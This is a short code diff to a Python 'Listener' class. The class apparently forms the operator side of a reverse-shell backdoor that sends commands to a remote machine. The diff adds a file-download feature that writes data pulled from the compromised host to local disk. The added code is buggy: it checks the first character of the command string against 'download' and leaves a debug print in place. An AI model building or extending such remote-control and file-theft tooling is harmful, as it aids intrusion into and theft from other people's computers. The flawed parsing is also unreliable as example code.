@@ -36,11 +36,21 @@ class Listener:
         except AttributeError:
             return "[-] AttributeError"
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download successful"
+
     def run(self):
         try:
             while True:
                 command = str(input(">> "))
                 result = self.execute_remotely(command)
+
+                if command[0] == "download":
+                    print("test d")
+                    result = self.write_file(command[1], result)
+
                 print(result)
         except KeyboardInterrupt:
             print("\n[-] Quiting")
